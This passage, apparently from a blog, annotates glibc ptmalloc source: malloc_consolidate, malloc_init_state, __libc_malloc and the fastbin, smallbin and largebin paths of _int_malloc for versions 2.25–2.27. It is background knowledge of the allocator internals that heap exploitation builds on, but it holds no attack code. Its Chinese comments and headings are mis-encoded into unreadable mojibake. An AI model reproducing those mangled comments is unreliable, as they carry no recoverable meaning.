first_unsorted     = unsorted_bin-&gt;fd;<br>                        unsorted_bin-&gt;fd   = p;<br>                        first_unsorted-&gt;bk = p;<br><br>                        <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                            p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                            p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                        &#125;<br><br>                        set_head(p, size | PREV_INUSE);<br>                        p-&gt;bk = unsorted_bin;<br>                        p-&gt;fd = first_unsorted;<br>                        set_foot(p, size);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//ç›´æ¥å’Œtop chunkåˆå¹¶</span><br>                        size += nextsize;<br>                        set_head(p, size | PREV_INUSE);<br>                        av-&gt;top = p;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//å¦‚æœè¿˜æ²¡æœ‰åˆå§‹åŒ–</span><br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="malloc-init-state"><a href="#malloc-init-state" class="headerlink" title="malloc_init_state"></a>malloc_init_state</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Initialize a malloc_state struct.</span><br><span class="hljs-comment">   This is called from ptmalloc_init () or from _int_new_arena ()</span><br><span class="hljs-comment">   when creating a new arena.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">malloc_init_state</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    mbinptr bin;<br>    <span class="hljs-comment">/* Establish circular links for normal bins */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i)<br>    &#123;<br>        bin = bin_at(av, i);<br>        bin-&gt;fd = bin-&gt;bk = bin; <span class="hljs-comment">//åˆå§‹åŒ–, æŠŠæ‰€æœ‰æŒ‡é’ˆéƒ½æŒ‡å‘è‡ªå·±</span><br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> MORECORE_CONTIGUOUS</span><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        set_noncontiguous(av);<br>    <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>        set_max_fast(DEFAULT_MXFAST);<br>    <span class="hljs-comment">//2.26, ä¸€ä¸ªarenaåœ¨é»˜è®¤æƒ…å†µä¸‹å¹¶ä¸æ‹¥æœ‰fastbin chunk</span><br>    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">//2.25:</span><br>    av-&gt;flags |= FASTCHUNKS_BIT;<br>    <span class="hljs-comment">//å°†è¯¥arevaçš„top chunkæŒ‡é’ˆæŒ‡å‘unsorted binï¼Œç”¨ä»¥è¡¨ç¤ºåˆå§‹æ—¶top chunkå¤§å°ä¸º0</span><br>    av-&gt;top = initial_top(av);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="ç”³è¯·å†…å­˜å—"><a href="#ç”³è¯·å†…å­˜å—" class="headerlink" title="ç”³è¯·å†…å­˜å—"></a>ç”³è¯·å†…å­˜å—</h1><h2 id="â€“libc-malloc"><a href="#â€“libc-malloc" class="headerlink" title="Â  â€“libc-malloc"></a><span id="__libc_malloc">Â </span> <a href="#libcmalloc">â€“libc-malloc</a></h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//è¿™åªæ˜¯ä¸€ä¸ª_int_mallocå‡½æ•°çš„ç®€å•wrapper</span><br><span class="hljs-keyword">void</span> * __libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim;<br>  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å†…å­˜åˆ†é…é’©å­ï¼Œå¦‚æœæœ‰ï¼Œè°ƒç”¨é’©å­å¹¶è¿”å›.</span><br>  <span class="hljs-keyword">void</span> *(*hook) (<span class="hljs-keyword">size_t</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>    <br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes = request2size (bytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <br>  <span class="hljs-comment">//æ¥ç€ä¼šå¯»æ‰¾ä¸€ä¸ª arena æ¥è¯•å›¾åˆ†é…å†…å­˜</span><br>  arena_get (ar_ptr, bytes);<br>  <span class="hljs-comment">//ç„¶åè°ƒç”¨ _int_malloc å‡½æ•°å»ç”³è¯·å¯¹åº”çš„å†…å­˜</span><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<span class="hljs-comment">//å¦‚æœåˆ†é…å¤±è´¥çš„è¯ï¼Œptmalloc ä¼šå°è¯•å†å»å¯»æ‰¾ä¸€ä¸ªå¯ç”¨çš„ arenaï¼Œå¹¶åˆ†é…å†…å­˜</span><br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//å¦‚æœç”³è¯·åˆ°äº† arenaï¼Œé‚£ä¹ˆåœ¨é€€å‡ºä¹‹å‰è¿˜å¾—è§£é”</span><br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">//è¦ä¹ˆæ²¡æœ‰ç”³è¯·åˆ°å†…å­˜</span><br>  <span class="hljs-comment">//è¦ä¹ˆæ˜¯ mmap çš„å†…å­˜</span><br>  <span class="hljs-comment">//è¦ä¹ˆç”³è¯·åˆ°çš„å†…å­˜å¿…é¡»åœ¨å…¶æ‰€åˆ†é…çš„ arena ä¸­</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-comment">//æœ€åè¿”å›å†…å­˜</span><br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="int-malloc-éå¸¸ä¹‹é•¿"><a href="#int-malloc-éå¸¸ä¹‹é•¿" class="headerlink" title="_int_malloc(éå¸¸ä¹‹é•¿)"></a>_int_malloc(éå¸¸ä¹‹é•¿)</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> * _int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes)<br></code></pre></div></td></tr></table></figure><h3 id="å˜é‡å®šä¹‰"><a href="#å˜é‡å®šä¹‰" class="headerlink" title="å˜é‡å®šä¹‰"></a>å˜é‡å®šä¹‰</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><span class="hljs-comment">//if glibc2.26 and after</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_count;            <span class="hljs-comment">/* count of unsorted chunks processed */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REMOVE_FB(fb, victim, pp)                        \</span><br><span class="hljs-meta">  do                                                        \</span><br><span class="hljs-meta">    &#123;                                                        \</span><br><span class="hljs-meta">      victim = pp;                                        \</span><br><span class="hljs-meta">      <span class="hljs-meta-keyword">if</span> (victim == NULL)                                \</span><br><span class="hljs-meta">        break;                                                \</span><br><span class="hljs-meta">    &#125;                                                        \</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta">         != victim);   </span><br></code></pre></div></td></tr></table></figure><h3 id="ç®€å•çš„check"><a href="#ç®€å•çš„check" class="headerlink" title="ç®€å•çš„check"></a>ç®€å•çš„check</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">     size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">     that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">     aligned.</span><br><span class="hljs-comment">   */</span><br>  checked_request2size (bytes, nb);<br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-keyword">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>        alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></div></td></tr></table></figure><ul><li>æ³¨æ„åˆ°checked_request2size()æ˜¯ä¸€ä¸ªå®å®šä¹‰, å¯ä»¥<strong>æ”¹å˜å‚æ•°nbçš„å€¼</strong> </li></ul><h3 id="fastbin-range"><a href="#fastbin-range" class="headerlink" title="fastbin_range"></a>fastbin_range</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><h4 id="2-25"><a href="#2-25" class="headerlink" title="2.25"></a>2.25</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast()))<br>&#123;<br>    idx = fastbin_index(nb);<br>    mfastbinptr *fb = &amp;fastbin(av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span> <span class="hljs-comment">//å–å‡ºç¬¬ä¸€ä¸ªfastchunk</span><br>    &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);<br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="hljs-number">0</span>))<br>        &#123;<span class="hljs-comment">//è¯·æ±‚çš„bytes-&gt;nb-&gt;idx-&gt;fb, æ‰€ä»¥idxæ˜¯æŒ‰ç…§bytesæ¥ç¡®å®šçš„, ä»è¿™ç»„idxé‡Œå–å‡ºä¸€ä¸ªfastbinchunk,</span><br>            <span class="hljs-comment">//å°†ä»–çš„å¤§å°è½¬æ¢ä¸ºä¸‹æ ‡, å¦‚æœè¿™ä¸¤ä¸ªä¸ç›¸ç­‰è¯´æ˜fastbinçš„sizeæ®µè¢«ç¯¡æ”¹</span><br>            <span class="hljs-comment">//chunksize(victim) != nbæƒ³æ¥ä¹Ÿä¸€æ ·å§(?</span><br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>        errout:<br>            malloc_printerr(check_action, errstr, chunk2mem(victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-comment">//æ£€æŸ¥arena,å¤§å°,alignment,chunk_sizeç­‰ç­‰</span><br>        check_remalloced_chunk(av, victim, nb);<br>        <span class="hljs-comment">//è¿”å›ç”¨æˆ·æŒ‡é’ˆ</span><br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        <span class="hljs-comment">//å¦‚æœè®¾ç½®äº†perturb_type, åˆ™å°†è·å–åˆ°çš„chunkåˆå§‹åŒ–ä¸º perturb_type ^ 0xff</span><br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-26"><a href="#2-26" class="headerlink" title="2.26"></a>2.26</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>            *fb = victim-&gt;fd;<br>          <span class="hljs-keyword">else</span><br>            REMOVE_FB (fb, pp, victim);<br>          <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>            &#123;<br>              <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>              <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>                malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>              check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>              <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">                 stash them in the tcache.  */</span><br>              <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>              <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>                &#123;<br>                  mchunkptr tc_victim;<br>                  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>                  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                         &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>                    &#123;<br>                      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                        *fb = tc_victim-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          REMOVE_FB (fb, pp, tc_victim);<br>                          <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                      tcache_put (tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="smallbin-range-2-27"><a href="#smallbin-range-2-27" class="headerlink" title="smallbin_range 2.27"></a>smallbin_range 2.27</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">     hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">     processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">     anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">   */</span><br><span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>    &#123;<br>        idx = smallbin_index(nb);<br>        bin = bin_at(av, idx);<br><br>        <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin) <span class="hljs-comment">//FIFO</span><br>        &#123;<br>            bck = victim-&gt;bk; <span class="hljs-comment">//å–å‡ºå€’æ•°ç¬¬äºŒä¸ªchunk</span><br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))<br>                malloc_printerr(<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>            set_inuse_bit_at_offset(victim, nb);<br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br>            check_malloced_chunk(av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">            stash them in the tcache.  */</span><br>            <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br>            <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>            &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                    &#123;<br>                        bck = tc_victim-&gt;bk;<br>                        set_inuse_bit_at_offset(tc_victim, nb);<br>                        <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                            set_non_main_arena(tc_victim);<br>                        bin-&gt;bk = bck;<br>                        bck-&gt;fd = bin;<br><br>                        tcache_put(tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>            <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="largebin-range"><a href="#largebin-range" class="headerlink" title="largebin_range"></a>largebin_range</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*     If this is a large request, consolidate fastbins before continuing.     </span><br><span class="hljs-comment">    While it might look excessive to kill all fastbins before     </span><br><span class="hljs-comment">    even seeing if there is space available, this avoids     </span><br><span class="hljs-comment">    fragmentation problems normally associated with fastbins.     </span><br><span class="hljs-comment">    Also, in practice, programs tend to have runs of either small or     </span><br><span class="hljs-comment">    large requests, but less often mixtures, so consolidation is not     </span><br><span class="hljs-comment">    invoked all that often in most programs. And the programs that     </span><br><span class="hljs-comment">    it is called frequently in otherwise tend to fragment.   */</span><br><span class="hljs-keyword">else</span><br>&#123;<br>    idx = largebin_index(nb);<br>    <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>        malloc_consolidate(av);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>ç®€è€Œè¨€ä¹‹å°±æ˜¯å…ˆæ‰§è¡Œ<a href="#malloc_consolidate">malloc_consolidate</a>(), åˆå¹¶fastbinä¸­çš„free chunks</li></ul><h3 id="unsorted-bin-å¤§å¾ªç¯"><a href="#unsorted-bin-å¤§å¾ªç¯" class="headerlink" title="unsorted bin å¤§å¾ªç¯"></a><em><u>unsorted bin å¤§å¾ªç¯</u></em></h3><figure class="highlight c"><table><tr><td 